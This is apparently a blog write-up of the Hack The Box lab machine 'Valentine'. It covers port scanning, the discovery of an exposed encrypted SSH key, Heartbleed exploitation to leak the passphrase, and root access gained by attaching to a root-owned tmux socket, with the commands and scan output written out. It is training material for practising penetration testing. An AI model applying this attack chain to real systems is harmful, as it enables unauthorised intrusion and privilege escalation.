---

title: HTB [VALENTINE] [LINUX]

date: 2022-06-03 18:23:05 +0200

categories: [htb]

tags: [HACKTHEBOX MACHINES]

---

![](https://i.imgur.com/73ZoDLC.png)

## Valentine

**Enumeration:**

```css
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2022-06-03T18:27:25+00:00; +21s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Directory bruteforcing:**

```css
301        9l       28w      310c http://10.129.1.190/dev
200        1l        2w       38c http://10.129.1.190/index
200        8l       39w      227c http://10.129.1.190/dev/notes
403       10l       30w      293c http://10.129.1.190/server-status
200       27l       54w      554c http://10.129.1.190/encode
```
- /dev seems interesting

![](https://i.imgur.com/WQQDhr4.png)
- It contains two files

```
# notes.txt

To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```
-  And there's a long hex encoded string in `hype_key` file

![](https://i.imgur.com/0e6hfFX.png)
- Decoding that to ascii revealed that, it's a private key
- Also there's a `/encode` path it simply encodes the string into base64
- Then we can decode that text in `/decode` path (base64 -> ascii)


![](https://i.imgur.com/ivNtDJy.png)
- This banner tells that blood is bleeding from the heart
- Let's scan for some heart blead bugs


```css
443/tcp open  https
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.cvedetails.com/cve/2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      http://cvedetails.com/cve/2014-0160/
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_sslv2-drown:
```
- The scan reveals it's vulnerable to **Heartbleed Bug**

![](https://i.imgur.com/kYdVV3F.png)
- Let's try this exploit

![](https://i.imgur.com/O8s306c.png)
- This text seems interesting let's decode that

```bash
➜  ~  echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype
```
- Looks like a password
- Let's use the previous hype_key to ssh now
- It asked for a passphrase, let's use this

![](https://i.imgur.com/HpEuNw5.png)
- Cool we logged in, I used hype as a user name here, it's just a guess with the file name `hype_key`
- Let's grab the user.txt

**privesc:**

![](https://i.imgur.com/Qz9mn4i.png)
- This file is interesting coz it's owned by root

![](https://i.imgur.com/Hvxozjr.png)
- Also there's  a session running as root
- simply we acn run that command `/usr/bin/tmux -S /.devs/dev_sess`
- to get that session coz that `/.devs/dev_sess` file is owned by hype group and that's us, we're having access to that file

![](https://i.imgur.com/KlrmMIP.png)
- Cool we rooted it!!
